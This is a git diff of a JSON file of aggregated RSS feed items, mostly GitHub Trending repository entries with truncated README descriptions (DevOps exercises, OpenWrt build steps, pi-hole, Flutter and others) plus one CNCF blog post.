@@ -22,6 +22,15 @@
       "siteUrl": "https://www.cncf.io",
       "articles": [
         {
+          "id": "https://www.cncf.io/?p=65570",
+          "author": "Jessie",
+          "description": "Guest post originally published on Kong’s blog by Scott Lowe In my Service Mesh 101 article, I talked about some of the basics behind a service mesh: what it is, what it does and...",
+          "link": "https://www.cncf.io/blog/2021/11/09/service-mesh-102-envoy-configuration/",
+          "publishedOn": "2021-11-09T16:00:00.000Z",
+          "wordCount": 1379,
+          "title": "Service mesh 102: Envoy configuration"
+        },
+        {
           "id": "https://www.cncf.io/?p=65481",
           "author": "Jessie",
           "description": "Guest post originally published on Magalix’s blog by Andrew Zola Kubernetes is a leader in container orchestration. According to Statista, as much as 46% of respondents in a recent survey stated that they...",
@@ -349,6 +358,114 @@
       "feedUrl": "https://mshibanami.github.io/GitHubTrendingRSS/daily/all.xml",
       "siteUrl": "http://mshibanami.github.io/GitHubTrendingRSS",
       "articles": [
+        {
+          "id": "https://github.com/bregman-arie/devops-exercises",
+          "author": null,
+          "description": "Linux, Jenkins, AWS, SRE, Prometheus, Docker, Python, Ansible, Git, Kubernetes, Terraform, OpenStack, SQL, NoSQL, Azure, GCP, DNS, Elastic, Network, Virtualization. DevOps Interview Questions\n\n\n \nℹ  This repo contains questions and exercises on various technical topics, sometimes related to DevOps and SRE :)\n \n📊  There are currently 1899 questions\n \n📚  To learn more about DevOps and SRE, check the resources in devops-resources repository\n \n⚠  You can use these for preparing for an interview but most of the questions and exercises don't represent an actual interview. Please read FAQ page for more details\n \n👥  Join our DevOps community where we have discussions and share resources on DevOps\n \n📝  You can add more questions and exercises by submitting pull requests :) Read about contributi…",
+          "link": "https://github.com/bregman-arie/devops-exercises",
+          "publishedOn": "2021-11-10T00:53:23.206Z",
+          "wordCount": 34429,
+          "title": "bregman-arie/devops-exercises"
+        },
+        {
+          "id": "https://github.com/coolsnowwolf/lede",
+          "author": null,
+          "description": "Lean's OpenWrt source\n\n欢迎来到Lean的Openwrt源码仓库！\n \nEnglish\n \n如何编译自己需要的 OpenWrt 固件\n \n注意：\n \n \n \n不要用 root 用户进行编译！！！\n \n \n国内用户编译前最好准备好梯子\n \n \n默认登陆IP 192.168.1.1 密码 password\n \n \n编译命令如下:\n \n \n \n 首先装好 Ubuntu 64bit，推荐 Ubuntu 20.04 LTS x64\n  \n \n 命令行输入 sudo apt-get update ，然后输入 sudo apt-get -y install build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch python3 python2.7 unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib antlr3 gperf wget curl swig rsync\n  \n \n 使用 git clone https://github.com/coolsnowwolf/lede 命令下载好源代码，然后 cd lede 进入目录\n  \n \n ./scripts/feeds update -a\n./scripts/feeds install -a\nmake menuconfig\n\n  \n \n make -j8 download V=s 下载dl库（国内请尽量全局科学上网）\n  \n \n 输入 make -j1 V=s （-j1 后面是线程数。第一次编译推荐用单线程）即可开始编译你要的固件了。\n  \n \n本套代码保证肯定可以编译成功。里面包括了 R21 所有源代码，包括 IPK 的。\n \n你可以自由使用，但源码编译二次发布请注明我的 GitHub 仓库链接。谢谢合作！\n \n二次编译：\n \ncd lede\ngit pull\n./scripts/feeds update -a && ./scripts/feeds install -a\nmake defconfig\nmake -j8 download\nmake -j$(($(nproc) + 1)) V=s\n\n \n如果需要重新配置：\n \nrm -rf ./tmp && rm -rf .config\nmake menuconfig\nmake -j$(($(nproc) + 1)) V=s\n\n \n编译完成后输出路径：bin/targets\n \n如果你使用WSL或WSL2进行编译：\n \n由于wsl的PATH路径中包含带有空格的Windows路径，有可能会导致编译失败，请在将make -j1 V=s或make -j$(($(nproc) + 1)) V=s改为\n \n首次编译：\n \nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin make -j1 V=s \n\n \n二次编译：\n \nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin make -j$(($(nproc) + 1)) V=s\n\n \n特别提示：\n \n \n \n 源代码中绝不含任何后门和可以监控或者劫持你的 HTTPS 的闭源软件， SSL 安全是互联网最后的壁垒。安全干净才是固件应该做到的；\n  \n \n 如有技术问题需要讨论，欢迎加入 QQ 讨论群： OP 共享技术交流群 ,号码 297253733 ，加群链接: 点击链接加入群聊【 OP 共享技术交流群】：点击加入\n  \n \n 想学习 OpenWrt 开发，但是摸不着门道？自学没毅力？基础太差？怕太难学不会？跟着佐大学 OpenWrt 开发入门培训班助你能学有所成 报名地址：点击报名\n  \n \n软路由介绍\n \n友情推荐不恰饭：如果你在寻找一个低功耗小体积性能不错的 x86 / x64 路由器，我个人建议可以考虑 小马v1 的铝合金版本 ( N3710 4千兆)：页面介绍\n \n \n \n捐贈\n \n如果你觉得此项目对你有帮助，可以捐助我们，以鼓励项目能持续发展，更加完善\n \n支付宝\n \n\n \n微信",
+          "link": "https://github.com/coolsnowwolf/lede",
+          "publishedOn": "2021-11-10T00:53:23.026Z",
+          "wordCount": 793,
+          "title": "coolsnowwolf/lede"
+        },
+        {
+          "id": "https://github.com/pi-hole/pi-hole",
+          "author": null,
+          "description": "A black hole for Internet advertisements\n\n \n    \n Network-wide ad blocking via your own Linux hardware \n \n \nThe Pi-hole® is a DNS sinkhole that protects your devices from unwanted content without installing any client-side software.\n \n \n \nEasy-to-install: our versatile installer walks you through the process and takes less than ten minutes\n \n \nResolute: content is blocked in non-browser locations, such as ad-laden mobile apps and smart TVs\n \n \nResponsive: seamlessly speeds up the feel of everyday browsing by caching DNS queries\n \n \nLightweight: runs smoothly with minimal hardware and software requirements\n \n \nRobust: a command line interface that is quality assured for interoperability\n \n \nInsightful: a beautiful responsive Web Interface dashboard to view and control your Pi-hole\n \n \nVersa…",
+          "link": "https://github.com/pi-hole/pi-hole",
+          "publishedOn": "2021-11-10T00:53:22.988Z",
+          "wordCount": 1601,
+          "title": "pi-hole/pi-hole"
+        },
+        {
+          "id": "https://github.com/3b1b/manim",
+          "author": null,
+          "description": "Animation engine for explanatory math videos\n\n    \n \n    \n \nManim is an engine for precise programmatic animations, designed for creating explanatory math videos.\n \nNote, there are two versions of manim. This repository began as a personal project by the author of 3Blue1Brown for the purpose of animating those videos, with video-specific code available here. In 2020 a group of developers forked it into what is now the community edition, with a goal of being more stable, better tested, quicker to respond to community contributions, and all around friendlier to get started with. See this page for more details.\n \nInstallation\n \n \n \nWARNING: These instructions are for ManimGL only. Trying to use these instructions to install ManimCommunity/manim or instructions there to install this version wi…",
+          "link": "https://github.com/3b1b/manim",
+          "publishedOn": "2021-11-10T00:53:22.945Z",
+          "wordCount": 1175,
+          "title": "3b1b/manim"
+        },
+        {
+          "id": "https://github.com/flutter/flutter",
+          "author": null,
+          "description": "Flutter makes it easy and fast to build beautiful apps for mobile and beyond\n\n\n \n  \n \nFlutter is Google's SDK for crafting beautiful, fast user experiences for mobile, web, and desktop from a single codebase. Flutter works with existing code, is used by developers and organizations around the world, and is free and open source.\n \nDocumentation\n \n \n \nInstall Flutter\n \n \nFlutter documentation\n \n \nDevelopment wiki\n \n \nContributing to Flutter\n \n \nFor announcements about new releases and breaking changes, follow the flutter-announce@googlegroups.com mailing list or see the breaking changes page.\n \nTerms of service\n \nThe Flutter tool may occasionally download resources from Google servers. By downloading or using the Flutter SDK you agree to the Google Terms of Service: https://policies.google.c…",
+          "link": "https://github.com/flutter/flutter",
+          "publishedOn": "2021-11-10T00:53:22.904Z",
+          "wordCount": 1085,
+          "title": "flutter/flutter"
+        },
+        {
+          "id": "https://github.com/raysan5/raylib",
+          "author": null,
+          "description": "A simple and easy-to-use library to enjoy videogames programming\n \nraylib is a simple and easy-to-use library to enjoy videogames programming.\n \nraylib is highly inspired by Borland BGI graphics lib and by XNA framework and it's specially well suited for prototyping, tooling, graphical applications, embedded systems and education.\n \nNOTE for ADVENTURERS: raylib is a programming library to enjoy videogames programming; no fancy interface, no visual helpers, no debug button... just coding in the most pure spartan-programmers way.\n \nReady to learn? Jump to code examples!\n \n \n \n   \n \n   \n \n    \n \n  \n \nfeatures\n \n \n \nNO external dependencies, all required libraries are bundled into raylib\n \n \nMultiple platforms supported: Windows, Linux, MacOS, RPI, Android, HTML5... and more!\n \n \nWritten in pl…",
+          "link": "https://github.com/raysan5/raylib",
+          "publishedOn": "2021-11-10T00:53:22.867Z",
+          "wordCount": 1286,
+          "title": "raysan5/raylib"
+        },
+        {
+          "id": "https://github.com/AsyncBanana/microdiff",
+          "author": null,
+          "description": "A fast, zero dependency object and array comparison library. Significantly faster than most other deep comparison libraries and has full TypeScript support.\n\n \n \n\n \n \nMicrodiff is a tiny (currently <1kb), fast, zero dependency object and array comparison library. It is significantly faster than most other deep comparison libraries, and has full TypeScript support.\n \n \n  \n \n \nFeatures\n \n \n \n🚀 More than double the speed of other object diff libraries\n \n \n📦 Extremely lightweight, <1kb minified\n \n \n🌎 Supports Deno, Node, the web, and even service workers. Also comes with built in Typescript types\n \n \n🔰 Very easy to use, having just a single diff() function\n \n \n📅 Full support for objects like new Date() and new RegExp()\n \n \nGet started\n \nFirst, install Microdiff\n \nnpm i microdiff\n\n \nIf you…",
+          "link": "https://github.com/AsyncBanana/microdiff",
+          "publishedOn": "2021-11-10T00:53:22.819Z",
+          "wordCount": 827,
+          "title": "AsyncBanana/microdiff"
+        },
+        {
+          "id": "https://github.com/TheAlgorithms/Python",
+          "author": null,
+          "description": "All Algorithms implemented in Python\n\n \n  \n    \n \nThe Algorithms - Python\n \n  \n  \n    \n    \n    \n  \n    \n    \n  \n \n \n    \n    \n    \n    \n  \n \nAll algorithms implemented in Python - for education\n \n \nImplementations are for learning purposes only. As they may be less efficient than the implementations in the Python standard library, use them at your discretion.\n \nGetting Started\n \nRead through our Contribution Guidelines before you contribute.\n \nCommunity Channels\n \nWe're on Discord and Gitter! Community channels are great for you to ask questions and get help. Please join us!\n \nList of Algorithms\n \nSee our directory for easier navigation and better overview of the project.",
+          "link": "https://github.com/TheAlgorithms/Python",
+          "publishedOn": "2021-11-10T00:53:22.797Z",
+          "wordCount": 1059,
+          "title": "TheAlgorithms/Python"
+        },
+        {
+          "id": "https://github.com/Python-World/python-mini-projects",
+          "author": null,
+          "description": "A collection of simple python mini projects to enhance your python skills\n\n   \n \nPython-Mini-Projects\n \n     \n \nA collection of simple python mini projects to enhance your Python skills.\n \nIf you want to learn about python, visit here.\n \nIf you are new to Github and open source then, visit here.\n \nSteps To Follow\n \n \n \n Select an issue and ask to be assigned to it.\n  \n \n Check existing scripts in the projects directory.\n  \n \n Star this repository.\n  \n \n On the python-mini-projects repo page, click the Fork button. \n\n  \n \n Clone your forked repository to your local machine. This button will show you the URL to run. \n\n For example, run this command inside your terminal:\n git clone https://github.com/<your-github-username>/python-mini-projects.git\n\n Replace <your-github-username>!\n Learn more…",
+          "link": "https://github.com/Python-World/python-mini-projects",
+          "publishedOn": "2021-11-10T00:53:22.703Z",
+          "wordCount": 1435,
+          "title": "Python-World/python-mini-projects"
+        },
+        {
+          "id": "https://github.com/vxunderground/MalwareSourceCode",
+          "author": null,
+          "description": "Collection of malware source code for a variety of platforms in an array of different programming languages.\n\n managed by vx-underground | follow us on Twitter | download malware samples at the VXUG/samples page\n \nLiability Disclaimer:\n \nTo the maximum extent permitted by applicable law, vx-underground and/or affiliates who have submitted content to vx-underground, shall not be liable for any indirect, incidental, special, consequential or punitive damages, or any loss of profits or revenue, whether incurred directly or indirectly, or any loss of data, use, goodwill, or other intangible losses, resulting from (i) your access to this resource and/or inability to access this resource; (ii) any conduct or content of any third party referenced by this resource, including without limitation, any defamatory, offensive or illegal conduct or other users or third parties; (iii) any content obtained from this resource\n \nContributors\n \nMarius 'f0wL' Genheimer\n Eduardo P. Gomez\n DartPower\n Avv",
+          "link": "https://github.com/vxunderground/MalwareSourceCode",
+          "publishedOn": "2021-11-10T00:53:22.639Z",
+          "wordCount": 677,
+          "title": "vxunderground/MalwareSourceCode"
+        },
+        {
+          "id": "https://github.com/coofcookie/Windows11Upgrade",
+          "author": null,
+          "description": "Windows 11 Upgrade tool that bypasses Microsoft´s requirements\n\n \n \nWindows11Upgrade\n \nWindows 11 Upgrade tool that bypasses new Microsoft´s requirements\n \n\n \n\n \n\n \nDownload\n \nDownload latest release (EN)\n \nDownload latest release (CZ)\n \nSystem Requirements\n \n \n  \n  \n \n    \n   Minimum \n   Recommended \n  \n \n  \n  \n  \n \n   OS \n   Windows 10 \n   Latest Windows 10 build \n  \n \n  \n \n   CPU \n   64-bit \n   64-bit \n  \n \n  \n \n   RAM \n   4 GB \n   8 GB+ \n  \n \n  \n \n* If you select any other language than your system language, Upgrade option will be disabled, only Data only and Clean install will be available!\n \nLicense\n \nWindows11Upgrade is free and open source software, it is using the GPL-3.0 license.\n \nSee LICENSE for the full license text.\n \nCredits\n \nCredits to AveYo for bypass.\n \nDonations\n \nYou can support the development of this and my future projects.\n \n \n  Donate with cryptocurrencies \n \n \n  Buy me a coffee",
+          "link": "https://github.com/coofcookie/Windows11Upgrade",
+          "publishedOn": "2021-11-10T00:53:22.598Z",
+          "wordCount": 506,
+          "title": "coofcookie/Windows11Upgrade"
+        },
+        {
+          "id": "https://github.com/ixartz/Next-js-Boilerplate",
+          "author": null,
+          "description": "🚀 Boilerplate and Starter for Next.js 12+, Tailwind CSS 2.0 and TypeScript ⚡️ Made with developer experience first: Next.js + TypeScript + ESLint + Prettier + Husky + Lint-Staged + VSCode + Netlify + PostCSS + Tailwind CSS\n\nBoilerplate and Starter for Next JS 12+, Tailwind CSS 2.0 and TypeScript \n \n  \n \n🚀 Boilerplate and Starter for Next.js, Tailwind CSS and TypeScript ⚡️ Made with developer experience first: Next.js, TypeScript, ESLint, Prettier, Husky, Lint-Staged, VSCode, Netlify, PostCSS, Tailwind CSS.\n \nClone this project and use it to create your own Next.js project. You can check a Next js templates demo.\n \nFeatures\n \nDeveloper experience first:\n \n \n \n🔥 Next.js for Static Site Generator\n \n \n🎨 Integrate with Tailwind CSS (w/ JIT mode)\n \n \n💅 PostCSS for processing Tailwind CSS an…",
+          "link": "https://github.com/ixartz/Next-js-Boilerplate",
+          "publishedOn": "2021-11-10T00:53:22.560Z",
+          "wordCount": 1374,
+          "title": "ixartz/Next-js-Boilerplate"
+        },
         {
           "id": "https://github.com/sherlock-project/sherlock",
           "author": null,
@@ -3300,141 +3417,6 @@
           "publishedOn": "2021-10-12T00:57:46.236Z",
           "wordCount": 1682,
           "title": "alibaba/spring-cloud-alibaba"
-        },
-        {
-          "id": "https://github.com/webpack/webpack",
-          "author": null,
-          "description": "A bundler for javascript and friends. Packs many modules into a few bundled assets. Code Splitting allows for loading parts of the application on demand. Through \"loaders\", modules can be CommonJs, AMD, ES6 modules, CSS, Images, JSON, Coffeescript, LESS, ... and your custom stuff.\n\n \n    \n \n \n \n \n \n\n \n \n       \n \n \n \n    \n    \n    \n    \n    \n    \n    \n \nwebpack\n \n \n Webpack is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset. \n \n \nTable of Contents\n \n \n \nInstall\n \n \nIntroduction\n \n \nConcepts\n \n \nContributing\n \n \nSupport\n \n \nCore Team\n \n \nSponsoring\n \n \nPremium Partners\n \n \nOther Backers and Sponsors\n \n \nGold Sponsors\n \n \nSilver Sponsors\n \n \nBronze Sponsors…",
-          "link": "https://github.com/webpack/webpack",
-          "publishedOn": "2021-10-11T00:55:27.853Z",
-          "wordCount": 2611,
-          "title": "webpack/webpack"
-        },
-        {
-          "id": "https://github.com/xinntao/Real-ESRGAN",
-          "author": null,
-          "description": "Real-ESRGAN aims at developing Practical Algorithms for General Image Restoration.\n\nReal-ESRGAN\n \n      \n \n \n \nColab Demo for Real-ESRGAN .\n \n \nPortable Windows / Linux / MacOS executable files for Intel/AMD/Nvidia GPU. You can find more information here.\n \n \nReal-ESRGAN aims at developing Practical Algorithms for General Image Restoration.\n We extend the powerful ESRGAN to a practical restoration application (namely, Real-ESRGAN), which is trained with pure synthetic data.\n \n🎨 Real-ESRGAN needs your contributions. Any contributions are welcome, such as new features/models/typo fixes/suggestions/maintenance, etc. See CONTRIBUTING.md. All contributors are list here.\n \n❓ Frequently Asked Questions can be found in FAQ.md.\n \n🚩 Updates\n \n \n \n✅ Add RealESRGAN_x4plus_anime_6B.pth, which is opti…",
-          "link": "https://github.com/xinntao/Real-ESRGAN",
-          "publishedOn": "2021-10-11T00:55:27.757Z",
-          "wordCount": 1409,
-          "title": "xinntao/Real-ESRGAN"
-        },
-        {
-          "id": "https://github.com/rishikeshreddyakkireddy/designtodevelopment",
-          "author": null,
-          "description": "This repository is all about converting design inspirations into code.\n\nDesignToDevelopment D2D\n \nWelcome to my repository :)\n \nI will provide you the design, Can you code?\n \nNow a days building things on the internet has more value than ever. Web development is the most in-demand skill and I believe that, the fastest way to acquire a skill is by building things. You can improve your development skills by contributing to my repository.\n \nContribute through HacktoberFest\n \nPeople who are very new in the Open source Community star_struck and who are eagerly waiting to kickstart there journey in HACKTOBERFEST 2021 can contribute to this repository.\n \n\n \nContribution Guide Lines\n \n1. Fork The Repository\n \n2. Go To Issues Section\n \n3. Choose An Existing Issue\n \n4. Get Assigned\n \n5. Clone Your Forked Repository\n \ngit clone YOUR_FORKED_REPOSITORY_LINK\n\n \n6. Create A New Branch\n \ngit checkout -b BRANCH_NAME\n\n \n7. Create A New Floder\n \n \n \nCreate a folder with your name inside the design folder you are working on. Don't change the file names or add new files to the existing images folder\n \n \n8. Commit The Changes\n \ngit commit -m \"implemented design23\"\n\n \n \n \nExample: If you are working on design23 commit message should be \"implemented design23\"\n \n \n9. Push Your Changes To Your Remote Repository\n \ngit push origin BRANCH_NAME\n\n \n10. Create A Pull Request\n \n \n \nGive relevant PR message and add a snapshot of your design implementation.\n \n \n \n \nExample: If you are working on design 23 your message should be \"added design23\"\n \n \nPlease wait patiently until your PR get's reviewed :)\n \nRULES For Merging A PR.\n \nIf you had fun in contributing to our project than please make sure to star our repository",
-          "link": "https://github.com/rishikeshreddyakkireddy/designtodevelopment",
-          "publishedOn": "2021-10-11T00:55:27.708Z",
-          "wordCount": 1099,
-          "title": "rishikeshreddyakkireddy/designtodevelopment"
-        },
-        {
-          "id": "https://github.com/filecoin-project/lotus",
-          "author": null,
-          "description": "Implementation of the Filecoin protocol, written in Go\n\n    \n \nProject Lotus - 莲\n \n     \n  \nLotus is an implementation of the Filecoin Distributed Storage Network. For more details about Filecoin, check out the Filecoin Spec.\n \nBuilding & Documentation\n \n \n \nNote: The default master branch is the dev branch, please use with caution. For the latest stable version, checkout the most recent Latest release.\n \n \nFor complete instructions on how to build, install and setup lotus, please visit https://docs.filecoin.io/get-started/lotus. Basic build instructions can be found further down in this readme.\n \nReporting a Vulnerability\n \nPlease send an email to security@filecoin.org. See our security policy for more details.\n \nRelated packages\n \nThese repos are independent and reusable modules, but are…",
-          "link": "https://github.com/filecoin-project/lotus",
-          "publishedOn": "2021-10-11T00:55:27.651Z",
-          "wordCount": 1696,
-          "title": "filecoin-project/lotus"
-        },
-        {
-          "id": "https://github.com/ollypwn/Certipy",
-          "author": null,
-          "description": "Python implementation for Active Directory certificate abuse\n\nCertipy\n \nCertipy is a Python tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).\n \nBased on the C# variant Certify from @harmj0y and @tifkin_.\n \nTable Of Contents\n \n \n \nCertipy \n  \n \n   \nInstallation\n \n   \nUsage\n \n   \nExamples \n    \n \n     \nAuto\n \n     \nFind \n      \n \n       \nFind vulnerable templates\n \n       \nFind all templates\n \n      \n  \n     \nRequest \n      \n \n       \nRequest as another user\n \n       \nRequest as self\n \n      \n  \n     \nAuthenticate\n \n     \nUsing the NT hash\n \n     \nUsing the credential cache\n \n    \n  \n   \nErrors\n \n   \nCredits\n \n  \n  \n \nInstallation\n \n$ python3 setup.py install\n\n \nRemember to add the Python scripts directory to your path.\n \nUsage\n \n$ certipy -h\nusa…",
-          "link": "https://github.com/ollypwn/Certipy",
-          "publishedOn": "2021-10-11T00:55:27.598Z",
-          "wordCount": 2003,
-          "title": "ollypwn/Certipy"
-        },
-        {
-          "id": "https://github.com/ant-design/ant-design-pro",
-          "author": null,
-          "description": "👨🏻‍💻👩🏻‍💻 Use Ant Design like a Pro!\n\nLanguage : 🇺🇸 | 🇨🇳 | 🇷🇺 | 🇹🇷 | 🇯🇵 | 🇫🇷 | 🇵🇹 | 🇸🇦\n \nAnt Design Pro\n \n \n \nAn out-of-box UI solution for enterprise applications as a React boilerplate.\n \n \n    \n \n \n   \n \n \n\n \n \n \n \nPreview: http://preview.pro.ant.design\n \n \nHome Page: http://pro.ant.design\n \n \nDocumentation: http://pro.ant.design/docs/getting-started\n \n \nChangeLog: http://pro.ant.design/docs/changelog\n \n \nFAQ: http://pro.ant.design/docs/faq\n \n \nMirror Site in China: http://ant-design-pro.gitee.io\n \n \n5.0 is out! 🎉🎉🎉\n \nAnt Design Pro 5.0.0\n \nTranslation Recruitment 📢\n \nWe need your help: https://github.com/ant-design/ant-design-pro/issues/120\n \nFeatures\n \n \n \n💡 TypeScript: A language for application-scale JavaScript\n \n \n📜 Blocks: Build page with block template\n…",
-          "link": "https://github.com/ant-design/ant-design-pro",
-          "publishedOn": "2021-10-11T00:55:27.547Z",
-          "wordCount": 1122,
-          "title": "ant-design/ant-design-pro"
-        },
-        {
-          "id": "https://github.com/vuejs/vue-next",
-          "author": null,
-          "description": "🖖 Vue.js is a progressive, incrementally-adoptable JavaScript framework for building UI on the web.\n\nvue-next  \n \nThis is the repository for Vue 3.0.\n \nQuickstart\n \n \n \n Via CDN: <script src=\"https://unpkg.com/vue@next\"></script>\n  \n \n In-browser playground on Codepen\n  \n \n Scaffold via Vite:\n # npm 6.x\nnpm init vite@latest my-vue-app --template vue\n# npm 7+, extra double-dash is needed:\nnpm init vite@latest my-vue-app -- --template vue\n# yarn\nyarn create vite my-vue-app --template vue\n\n  \n \n Scaffold via vue-cli:\n npm install -g @vue/cli # OR yarn global add @vue/cli\nvue create hello-vue3\n# select vue 3 preset\n\n  \n \nChanges from Vue 2\n \nPlease consult the Migration Guide.\n \nAlso note: Vue 3 does not support IE11 (RFC | Discussion).\n \nSupporting Libraries\n \nAll of our official libraries a…",
-          "link": "https://github.com/vuejs/vue-next",
-          "publishedOn": "2021-10-11T00:55:27.488Z",
-          "wordCount": 1049,
-          "title": "vuejs/vue-next"
-        },
-        {
-          "id": "https://github.com/zeromicro/go-zero",
-          "author": null,
-          "description": "go-zero is a web and rpc framework written in Go. It's born to ensure the stability of the busy sites with resilient design. Builtin goctl greatly improves the development productivity.\n \ngo-zero\n \nEnglish | 简体中文\n \n    \n \nNote: To meet the requirements of Open Source Foundation, we moved go-zero from tal-tech to zeromicro (a neutral GitHub organization).\n \n0. what is go-zero\n \ngo-zero (listed in CNCF Landscape: https://landscape.cncf.io/?selected=go-zero) is a web and rpc framework with lots of builtin engineering practices. It’s born to ensure the stability of the busy services with resilience design, and has been serving sites with tens of millions users for years.\n \ngo-zero contains simple API description syntax and code generation tool called goctl. You can generate Go, iOS, Android, K…",
-          "link": "https://github.com/zeromicro/go-zero",
-          "publishedOn": "2021-10-11T00:55:27.431Z",
-          "wordCount": 1572,
-          "title": "zeromicro/go-zero"
-        },
-        {
-          "id": "https://github.com/youzan/vant",
-          "author": null,
-          "description": "Lightweight Mobile UI Components built on Vue\n\n  \n \nVant\n \nMobile UI Components built on Vue\n \n       \n \n 🔥 文档网站（国内）   🌈 文档网站（GitHub）   🇨🇳 中文版介绍 \n \n \nFeatures\n \n \n \n65+ Reusable components\n \n \n1kb Component average size (min+gzip)\n \n \n90%+ Unit test coverage\n \n \nExtensive documentation and demos\n \n \nSupport Vue 2 & Vue 3\n \n \nSupport Tree Shaking\n \n \nSupport Custom Theme\n \n \nSupport i18n\n \n \nSupport TS\n \n \nSupport SSR\n \n \nInstall\n \n# Install Vant 2 for Vue 2 project\nnpm i vant -S\n\n# Install Vant 3 for Vue 3 project\nnpm i vant@next -S\n\n \nQuickstart\n \nimport { createApp } from 'vue';\nimport { Button } from 'vant';\nimport 'vant/lib/index.css';\n\nconst app = createApp();\napp.use(Button);\n\n \nSee more in Quickstart.\n \nContribution\n \nPlease make sure to read the Contributing Guide before making a pull request.\n \nBrowser Support\n \nVant 2 supports modern browsers and Android >= 4.0、iOS >= 8.0.\n \nVant 3 supports modern browsers and Chrome >= 51、iOS >= 10.0 (same as Vue 3).\n \nOfficial Ecosystem\n \n \n  \n  \n \n   Project \n   Description \n  \n \n  \n  \n  \n \n   vant-weapp \n   WeChat MiniProgram UI \n  \n \n  \n \n   vant-demo \n   Collection of Vant demos \n  \n \n  \n \n   vant-cli \n   Scaffold for UI library \n  \n \n  \n \n   vant-icons \n   Vant icons \n  \n \n  \n \n   vant-touch-emulator \n   Using vant in desktop browsers \n  \n \n  \n \nCommunity Ecosystem\n \n \n  \n  \n \n   Project \n   Description \n  \n \n  \n  \n  \n \n   3lang3/react-vant \n   React mobile UI Components base on Vant \n  \n \n  \n \n   mxdi9i7/vant-react \n   Mobile UI Components built on React and TS, inspired by Vant \n  \n \n  \n \n   vant-aliapp \n   Alipay MiniProgram UI \n  \n \n  \n \n   taroify \n   Vant Taro \n  \n \n  \n \n   vant-theme \n   online theme preview built on Vant UI \n  \n \n  \n \nLinks\n \n \n \nDocumentation\n \n \nChangelog\n \n \nGitter\n \n \nPreview\n \nYou can scan the following QR code to access the demo：\n \n \nLICENSE\n \nMIT",
-          "link": "https://github.com/youzan/vant",
-          "publishedOn": "2021-10-11T00:55:27.393Z",
-          "wordCount": 805,
-          "title": "youzan/vant"
-        },
-        {
-          "id": "https://github.com/nlohmann/json",
-          "author": null,
-          "description": "JSON for Modern C++\n\n\n \n                  \n \n \n \nDesign goals\n \n \nSponsors\n \n \nSupport (documentation, FAQ, discussions, API, bug issues)\n \n \nExamples \n  \n \n   \nJSON as first-class data type\n \n   \nSerialization / Deserialization\n \n   \nSTL-like access\n \n   \nConversion from STL containers\n \n   \nJSON Pointer and JSON Patch\n \n   \nJSON Merge Patch\n \n   \nImplicit conversions\n \n   \nConversions to/from arbitrary types\n \n   \nSpecializing enum conversion\n \n   \nBinary formats (BSON, CBOR, MessagePack, and UBJSON)\n \n  \n  \n \nSupported compilers\n \n \nIntegration \n  \n \n   \nCMake\n \n   \nPackage Managers\n \n   \nPkg-config\n \n  \n  \n \nLicense\n \n \nContact\n \n \nThanks\n \n \nUsed third-party tools\n \n \nProjects using JSON for Modern C++\n \n \nNotes\n \n \nExecute unit tests\n \n \nDesign goals\n \nThere are myriads of JSON libra…",
-          "link": "https://github.com/nlohmann/json",
-          "publishedOn": "2021-10-11T00:55:27.336Z",
-          "wordCount": 11541,
-          "title": "nlohmann/json"
-        },
-        {
-          "id": "https://github.com/bregman-arie/devops-resources",
-          "author": null,
-          "description": "DevOps resources - Linux, Jenkins, AWS, SRE, Prometheus, Docker, Python, Ansible, Git, Kubernetes, Terraform, OpenStack, SQL, NoSQL, Azure, GCP\n\n\n \nℹ  This repository is about gathering any useful resources and information regarding DevOps and secondly, provide some roadmap for those who want to practice DevOps.\n \n📝  Feel free to add more resources by sumitting pull requests\n \n \n \n \n \n \n \n \n  \n   \n \n    \nDevOps \n    \nJenkins \n    \nGit \n    \nAnsible \n    \nNetwork \n    \nLinux \n    \nTerraform \n    \nContainers \n   \n \n   \n \n    \nCoding \n    \nPython \n    \nGo \n    \nShell Scripting \n    \nKubernetes \n    \nPrometheus \n    \nMongo \n    \nSQL \n   \n \n   \n \n    \nCloud \n    \nAWS \n    \nAzure \n    \nGoogle Cloud Platform \n    \nOpenStack \n    \nSecurity \n    \nPuppet \n    \nOpenShift \n   \n \n   \n \n    \nELK \n    \n…",
-          "link": "https://github.com/bregman-arie/devops-resources",
-          "publishedOn": "2021-10-11T00:55:27.186Z",
-          "wordCount": 2027,
-          "title": "bregman-arie/devops-resources"
-        },
-        {
-          "id": "https://github.com/ihciah/clean-dns-bpf",
-          "author": null,
-          "description": "基于 Rust + eBPF 丢弃 GFW DNS 污染包\n\nClean DNS with eBPF\n \n基于 Rust + eBPF 丢弃 GFW DNS 污染包\n \n \n \n注：只在 Linux 上能用，且需要内核支持 XDP。\n \n \nHow to Use\n \n \n \n下载 最新的 release\n \n \n想要加载到内核时(记得修改 eth0 为你的出口网卡名，以及修改 clean-dns.elf 的路径): \nsudo ip link set dev eth0 xdp obj ./clean-dns.elf\n\n 正常使用的话，只需要在网卡 ready 后把 elf 挂上去就行了（重启后需再次挂载）。\n \n \n当你想从内核卸载这个 bpf 时(同样，记得修改 eth0 为你的网卡名)： \nsudo ip link set dev eth0 xdp off\n\n 正常使用无需卸载。\n \n \nFeatures\n \n当挂在本 bpf 后，对应网卡上到 8.8.8.8:53 的 DNS 请求对应响应上的 GFW 污染会被过滤掉。\n \n即你可以在没有梯子的情况下得到正确的 8.8.8.8 对任意域名的解析结果。所以，如果你使用本程序，请记得将 dns 修改为 8.8.8.8。\n \nHow It Works\n \n本节大致说明工作原理。\n \nGFW 污染 DNS 的方式为抢答，我们只需要丢弃投毒响应即可获得正确的解析结果。通过 eBPF 我们可以在内核中插入代码，相比在用户态启动代理，这样可以获得更好的性能。\n \n要丢弃投毒响应，重点是找到它们的特征。\n \n以 twitter.com 为例，当向 8.8.8.8 请求 twitter.com 的 A 记录时，正常的响应会返回 2 条结果（1Q2A）；而 GFW 只会返回 1 条，但是使用了 2 次抢答。2 次抢答包其中一个 IP Id…",
